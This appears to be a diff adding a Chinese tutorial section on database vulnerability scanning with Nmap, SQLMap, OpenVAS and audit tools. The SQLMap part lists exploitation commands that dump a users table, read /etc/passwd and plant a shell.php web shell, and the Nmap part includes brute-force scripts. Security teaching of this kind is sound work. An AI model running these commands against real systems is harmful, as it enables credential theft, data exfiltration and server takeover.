@@ -1,0 +1,160 @@
+﻿## 10.11 数据库漏洞扫描
+
+### 10.11.1 使用Nmap进行数据库端口扫描
+
+Nmap是强大的网络扫描工具，可以用于发现数据库服务、识别数据库版本、检测开放端口等。
+
+```bash
+# 安装Nmap
+yum install -y nmap
+
+# 扫描常用数据库端口
+nmap -sV -p 3306,5432,27017,6379,1433 192.168.1.0/24
+
+# PORT      STATE    SERVICE        VERSION
+# 3306/tcp  open     mysql         MySQL 8.0.32
+# 5432/tcp  open     postgresql    PostgreSQL 14.5
+# 27017/tcp open     mongodb       MongoDB 6.0
+
+nmap -sV --version-intensity 5 -p 3306 target_server
+
+# 检测MySQL
+nmap -sV --script mysql-info,mysql-enum,mysql-databases,mysql-variables 192.168.1.100
+
+# 检测PostgreSQL
+nmap -p 5432 --script pgsql-brute,pgsql-version 192.168.1.100
+
+# 检测MongoDB
+nmap -p 27017 --script mongodb-info,mongodb-brute 192.168.1.100
+
+# 检测Redis
+nmap -p 6379 --script redis-info,redis-brute 192.168.1.100
+
+# 检测空密码
+nmap -p 3306 --script mysql-empty-password 192.168.1.100
+```
+
+### 10.11.2 使用SQLMap进行SQL注入检测
+
+SQLMap是开源的自动化SQL注入工具，可以检测和利用SQL注入漏洞。
+
+```bash
+# 安装SQLMap
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python sqlmap.py --version
+
+# 检测注入点
+python sqlmap.py -u "http://target.com/product?id=1"
+
+# 高级检测
+python sqlmap.py -u "http://target.com/login" \
+    --data="username=admin&password=123" \
+    --level=5 --risk=3 --threads=10
+
+# 枚举数据库
+python sqlmap.py -u "http://target.com/product?id=1" --dbs
+
+# available databases [5]:
+# [*] information_schema
+# [*] mysql
+# [*] performance_schema
+# [*] sys
+# [*] app_db
+
+# 枚举表
+python sqlmap.py -u "http://target.com/product?id=1" -D app_db --tables
+
+# 枚举列
+python sqlmap.py -u "http://target.com/product?id=1" -D app_db -T users --columns
+
+# 导出数据
+python sqlmap.py -u "http://target.com/product?id=1" -D app_db -T users --dump
+
+# 识别用户
+python sqlmap.py -u "http://target.com/product?id=1" --current-user
+
+# 检查DBA
+python sqlmap.py -u "http://target.com/product?id=1" --is-dba
+
+# 读取文件
+python sqlmap.py -u "http://target.com/product?id=1" --file-read=/etc/passwd
+
+# 写入文件
+python sqlmap.py -u "http://target.com/product?id=1" \
+    --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# 布尔盲注
+python sqlmap.py -u "http://target.com/product?id=1" --technique=B
+
+# 时间盲注
+python sqlmap.py -u "http://target.com/product?id=1" --technique=T
+
+# 生成报告
+python sqlmap.py -u "http://target.com/product?id=1" --batch --output-dir=/tmp/sqlmap_report
+```
+
+### 10.11.3 OpenVAS数据库漏洞扫描
+
+OpenVAS是开源的漏洞扫描器，可以全面扫描系统和应用的漏洞。
+
+```bash
+# 安装OpenVAS
+yum install -y openvas
+
+# Docker部署
+docker pull mikesplain/openvas
+docker run -d -p 9392:9392 --name openvas mikesplain/openvas
+
+# 访问Web界面
+# https://localhost:9392
+
+# 创建扫描任务
+# 1. 登录OpenVAS Web界面
+# 2. 创建Target
+# 3. 创建Task
+# 4. 执行扫描
+
+# 命令行扫描
+omp -h localhost -p 9393 -u admin -w admin_password \
+    -c <create_target><name>DB Servers</name><hosts>192.168.1.100</hosts></create_target>
+
+# 查看结果
+omp -h localhost -p 9393 -u admin -w admin_password -r
+
+# 生成PDF报告
+omp -h localhost -p 9393 -u admin -w admin_password \
+    --get-report report_uuid format=a001b002c003d004e005f006 > report.pdf
+```
+
+### 10.11.4 数据库配置审计工具
+
+专门的配置审计工具检查数据库安全配置是否符合最佳实践。
+
+```bash
+# MySQLTuner
+wget https://raw.githubusercontent.com/major/MySQLTuner-perl/master/mysqltuner.pl
+perl mysqltuner.pl --user root --pass password
+
+# PostgreSQL审计脚本
+cat << EOF > pg_audit.sh
+#!/bin/bash
+echo "=== PostgreSQL Security Audit ==="
+su - postgres -c "psql -c \"
+SELECT name, setting FROM pg_settings WHERE name = 'password_encryption';
+SELECT name, setting FROM pg_settings WHERE name LIKE '%ssl%';
+SELECT name, setting FROM pg_settings WHERE name LIKE 'log_%';
+SELECT COUNT(*) FROM pg_roles WHERE rolsuper = true;
+\""
+EOF
+
+# MongoDB审计
+pip install mongoaudit
+mongoaudit --host 192.168.1.100 --port 27017
+
+# 检查项：
+# - 认证是否启用
+# - 绑定IP是否安全
+# - 用户权限是否过宽
+# - SSL/TLS是否启用
+```
